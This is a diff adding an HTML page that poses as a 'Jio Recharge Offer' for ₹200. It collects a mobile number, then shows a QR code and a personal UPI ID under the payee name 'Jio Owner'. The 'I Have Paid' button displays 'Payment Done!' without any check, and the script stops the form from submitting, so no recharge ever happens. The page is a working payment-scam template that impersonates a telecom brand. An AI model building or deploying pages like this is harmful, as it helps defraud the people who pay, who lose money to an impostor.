@@ -1,0 +1,52 @@
+
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Recharge Offer</title>
+  <style>
+    body { font-family: Arial; background: #f7f7f7; padding: 20px; text-align: center; }
+    .box { background: white; padding: 20px; border-radius: 10px; max-width: 400px; margin: auto; box-shadow: 0 0 10px gray; }
+    .hidden { display: none; }
+    button { padding: 10px 20px; font-size: 16px; margin-top: 10px; background: #28a745; color: white; border: none; border-radius: 5px; }
+  </style>
+</head>
+<body>
+
+<div class="box">
+  <h2>🔥 Jio Recharge Offer – ₹200 Only</h2>
+
+  <form id="offerForm" action="https://formsubmit.co/YOUR@EMAIL.COM" method="POST">
+    <input type="text" name="mobile" placeholder="Enter Mobile Number" required><br><br>
+    <input type="hidden" name="offer" value="Jio Recharge ₹200">
+    <button type="submit">Submit</button>
+  </form>
+
+  <div id="paymentSection" class="hidden">
+    <h3>✅ Now Pay ₹200</h3>
+    <img src="upi_qr_jio_owner_200rs.png" alt="Scan QR" width="200"><br><br>
+    <p>or pay to UPI ID: <strong>9644548724@airtel</strong><br>(Payee Name: <strong>Jio Owner</strong>)</p>
+    <button onclick="showDone()">I Have Paid</button>
+  </div>
+
+  <div id="doneSection" class="hidden">
+    <h2>✅ Payment Done!</h2>
+    <p>Your recharge request has been received. Thank you!</p>
+  </div>
+</div>
+
+<script>
+  const form = document.getElementById('offerForm');
+  form.addEventListener('submit', function(e) {
+    e.preventDefault();
+    document.getElementById('paymentSection').classList.remove('hidden');
+    form.classList.add('hidden');
+  });
+
+  function showDone() {
+    document.getElementById('doneSection').classList.remove('hidden');
+    document.getElementById('paymentSection').classList.add('hidden');
+  }
+</script>
+
+</body>
+</html>
